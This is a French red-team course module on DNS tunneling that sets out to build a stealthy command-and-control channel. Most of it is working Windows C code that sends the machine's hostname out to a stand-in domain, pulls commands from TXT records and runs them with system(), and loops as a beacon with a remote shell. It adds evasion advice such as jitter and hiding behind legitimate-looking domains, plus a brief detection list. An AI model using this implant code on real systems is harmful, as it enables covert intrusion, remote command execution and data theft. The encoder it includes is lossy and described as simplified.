# DNS Communication - Tunneling et Exfiltration

## Objectifs pédagogiques

À la fin de ce module, vous serez capable de :
- [ ] Comprendre les techniques de tunneling DNS
- [ ] Utiliser les DNS queries pour la communication C2
- [ ] Exfiltrer des données via DNS (TXT/A records)
- [ ] Implémenter un canal C2 DNS furtif

## Prérequis

Avant de commencer ce module, assurez-vous de maîtriser :
- Les bases du protocole DNS (requêtes/réponses)
- Les fonctions réseau Windows (Winsock)
- L'encodage base32/base64

## Introduction

Le DNS tunneling est une technique qui encode des données dans des requêtes DNS. C'est un canal C2 très furtif car le DNS est rarement bloqué (nécessaire au fonctionnement réseau).

### Pourquoi ce sujet est important ?

**Analogie** : Le DNS est comme le service postal. Vous envoyez une lettre (requête DNS) pour demander une adresse, et vous recevez une réponse. Mais vous pouvez cacher des messages secrets dans l'adresse demandée!

**Exemple** :
```
Requête normale : google.com
Requête tunneling : dGVzdA==.c2server.com (données encodées dans le sous-domaine)
```

## Concepts fondamentaux

### Concept 1 : Principe du DNS Tunneling

```
┌─────────┐         Requête DNS          ┌──────────┐
│  Agent  │─────> data123.c2.com ──────>│   DNS    │
│   C2    │                              │  Server  │
└─────────┘<───── Réponse: 1.2.3.4 <─────└──────────┘
                  (données encodées)
```

**Fonctionnement** :
1. Agent encode les données en base32
2. Agent crée une requête DNS : `<donnees_encodees>.domaine-c2.com`
3. Serveur DNS C2 reçoit et décode la requête
4. Serveur répond avec des données encodées (adresse IP ou TXT record)

### Concept 2 : Types de records DNS

| Type | Usage | Exemple |
|------|-------|---------|
| **A** | Réponse en IPv4 | `192.168.1.100` (4 bytes de données) |
| **AAAA** | Réponse en IPv6 | `2001::1` (16 bytes de données) |
| **TXT** | Texte libre | `"cmd=whoami"` (255 bytes max) |
| **CNAME** | Alias | `redirect.c2.com` |

### Concept 3 : API DNS Windows

```c
// DnsQuery_A : Fonction principale pour requêtes DNS
#include <windns.h>
#pragma comment(lib, "dnsapi.lib")

DNS_STATUS DnsQuery_A(
    PCSTR pszName,        // Nom à résoudre
    WORD wType,           // Type (DNS_TYPE_A, DNS_TYPE_TXT)
    DWORD Options,        // Options
    PVOID pExtra,         // Paramètres supplémentaires
    PDNS_RECORD* ppQueryResults,  // Résultats
    PVOID* pReserved
);
```

## Mise en pratique

### Étape 1 : Requête DNS simple

```c
#include <windows.h>
#include <windns.h>
#include <stdio.h>
#pragma comment(lib, "dnsapi.lib")

int main() {
    PDNS_RECORD pDnsRecord = NULL;

    // Requête type A
    DNS_STATUS status = DnsQuery_A(
        "google.com",
        DNS_TYPE_A,
        DNS_QUERY_STANDARD,
        NULL,
        &pDnsRecord,
        NULL
    );

    if (status == 0) {
        printf("[+] DNS query successful\n");

        PDNS_RECORD pRecord = pDnsRecord;
        while (pRecord) {
            if (pRecord->wType == DNS_TYPE_A) {
                IN_ADDR addr;
                addr.S_un.S_addr = pRecord->Data.A.IpAddress;
                printf("IP: %s\n", inet_ntoa(addr));
            }
            pRecord = pRecord->pNext;
        }

        DnsRecordListFree(pDnsRecord, DnsFreeRecordList);
    } else {
        printf("[-] DNS query failed: %d\n", status);
    }

    return 0;
}
```

### Étape 2 : Exfiltrer des données via DNS

```c
#include <windows.h>
#include <windns.h>
#include <stdio.h>
#pragma comment(lib, "dnsapi.lib")

// Encoder en base32 (simplifié)
void Base32Encode(const char* input, char* output, size_t len) {
    const char* base32 = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";
    // Implémentation simplifiée pour l'exemple
    for (size_t i = 0; i < len && i < 32; i++) {
        output[i] = base32[(unsigned char)input[i] % 32];
    }
    output[len < 32 ? len : 32] = '\0';
}

BOOL ExfiltrateViaDNS(const char* data, const char* domain) {
    char encoded[64];
    char query[256];

    // Encoder les données
    Base32Encode(data, encoded, strlen(data));

    // Créer la requête DNS
    snprintf(query, sizeof(query), "%s.%s", encoded, domain);

    printf("[*] DNS query: %s\n", query);

    PDNS_RECORD pDnsRecord = NULL;
    DNS_STATUS status = DnsQuery_A(
        query,
        DNS_TYPE_A,
        DNS_QUERY_STANDARD,
        NULL,
        &pDnsRecord,
        NULL
    );

    if (status == 0) {
        printf("[+] Data exfiltrated\n");
        DnsRecordListFree(pDnsRecord, DnsFreeRecordList);
        return TRUE;
    }

    return FALSE;
}

int main() {
    // Exfiltrer le hostname
    char hostname[256];
    DWORD size = sizeof(hostname);
    GetComputerNameA(hostname, &size);

    ExfiltrateViaDNS(hostname, "exfil.c2server.com");

    return 0;
}
```

### Étape 3 : Récupérer des commandes via TXT records

```c
#include <windows.h>
#include <windns.h>
#include <stdio.h>
#pragma comment(lib, "dnsapi.lib")

char* GetCommandFromDNS(const char* domain) {
    PDNS_RECORD pDnsRecord = NULL;

    DNS_STATUS status = DnsQuery_A(
        domain,
        DNS_TYPE_TXT,  // Record TXT
        DNS_QUERY_BYPASS_CACHE,  // Ne pas utiliser le cache
        NULL,
        &pDnsRecord,
        NULL
    );

    if (status != 0) {
        return NULL;
    }

    char* command = NULL;
    PDNS_RECORD pRecord = pDnsRecord;

    while (pRecord) {
        if (pRecord->wType == DNS_TYPE_TXT) {
            // Extraire le texte
            DWORD stringCount = pRecord->Data.TXT.dwStringCount;
            if (stringCount > 0) {
                command = _strdup(pRecord->Data.TXT.pStringArray[0]);
                break;
            }
        }
        pRecord = pRecord->pNext;
    }

    DnsRecordListFree(pDnsRecord, DnsFreeRecordList);
    return command;
}

int main() {
    char* cmd = GetCommandFromDNS("cmd.c2server.com");

    if (cmd) {
        printf("[+] Command received: %s\n", cmd);

        // Exécuter la commande
        system(cmd);

        free(cmd);
    } else {
        printf("[-] No command received\n");
    }

    return 0;
}
```

### Étape 4 : Beacon DNS complet

```c
#include <windows.h>
#include <windns.h>
#include <stdio.h>
#pragma comment(lib, "dnsapi.lib")

#define C2_DOMAIN "beacon.c2server.com"
#define BEACON_INTERVAL 60000  // 60 secondes

char* QueryDNS_TXT(const char* query) {
    PDNS_RECORD pDnsRecord = NULL;

    DNS_STATUS status = DnsQuery_A(
        query,
        DNS_TYPE_TXT,
        DNS_QUERY_BYPASS_CACHE,
        NULL,
        &pDnsRecord,
        NULL
    );

    if (status != 0) return NULL;

    char* result = NULL;
    PDNS_RECORD pRecord = pDnsRecord;

    while (pRecord) {
        if (pRecord->wType == DNS_TYPE_TXT) {
            if (pRecord->Data.TXT.dwStringCount > 0) {
                result = _strdup(pRecord->Data.TXT.pStringArray[0]);
                break;
            }
        }
        pRecord = pRecord->pNext;
    }

    DnsRecordListFree(pDnsRecord, DnsFreeRecordList);
    return result;
}

void DNSBeaconLoop() {
    printf("[*] DNS Beacon started\n");

    while (1) {
        // Requête DNS pour obtenir des commandes
        char* command = QueryDNS_TXT(C2_DOMAIN);

        if (command) {
            printf("[+] Command: %s\n", command);

            // Parser et exécuter
            if (strncmp(command, "shell:", 6) == 0) {
                system(command + 6);
            }
            else if (strcmp(command, "exit") == 0) {
                free(command);
                break;
            }

            free(command);
        }

        Sleep(BEACON_INTERVAL);
    }

    printf("[*] Beacon stopped\n");
}

int main() {
    DNSBeaconLoop();
    return 0;
}
```

## Application offensive

### Contexte Red Team

**Avantages DNS C2** :
- DNS est rarement bloqué (nécessaire)
- Traverse les firewalls facilement
- Difficile à détecter dans les logs
- Fonctionne même sans accès HTTP/HTTPS

**Scénario d'attaque** :
```
1. Agent compromis envoie beacon DNS
2. Requête: <agent_id>.beacon.attacker.com
3. Serveur DNS attacker.com répond avec TXT record
4. TXT contient la commande encodée
5. Agent exécute et exfiltre résultats via DNS
```

### Considérations OPSEC

```
[Attention !]
- Volume de requêtes   -> Trop de requêtes = détection
- Taille des queries   -> Limiter à 63 chars par label
- TTL cache           -> Utiliser BYPASS_CACHE avec parcimonie
- Patterns            -> Varier les sous-domaines
- Chiffrement         -> Toujours encoder/chiffrer les données
```

**Détection** :
- Requêtes DNS inhabituellement longues
- Volume élevé de requêtes vers un même domaine
- Sous-domaines aléatoires (entropie élevée)
- Requêtes TXT fréquentes

**Contre-mesures** :
```c
// Ajouter du jitter
Sleep(BEACON_INTERVAL + (rand() % 30000));

// Limiter la taille des chunks
#define MAX_DNS_CHUNK 32

// Utiliser des domaines légitimes (DGA)
const char* domains[] = {
    "update.microsoft.com",
    "cdn.cloudflare.com",
    // ...avec sous-domaines custom
};
```

## Résumé

- **DNS tunneling** encode des données dans les requêtes/réponses DNS
- **Types records** : A (4 bytes), TXT (255 bytes), AAAA (16 bytes)
- **API Windows** : `DnsQuery_A()` avec `DNS_TYPE_A`, `DNS_TYPE_TXT`
- **Red Team** : Canal C2 furtif qui traverse les firewalls
- **OPSEC** : Limiter volume, encoder données, ajouter jitter
- **Détection** : Requêtes longues, volume élevé, entropie haute

## Ressources complémentaires

- [DNS Tunneling Explained](https://unit42.paloaltonetworks.com/dns-tunneling/)
- [iodine - DNS Tunnel Tool](https://github.com/yarrick/iodine)
- [dnscat2 - DNS C2 Framework](https://github.com/iagox86/dnscat2)

---

**Navigation**
- [Module précédent](../W48_json_parsing/)
- [Module suivant](../W50_domain_fronting/)
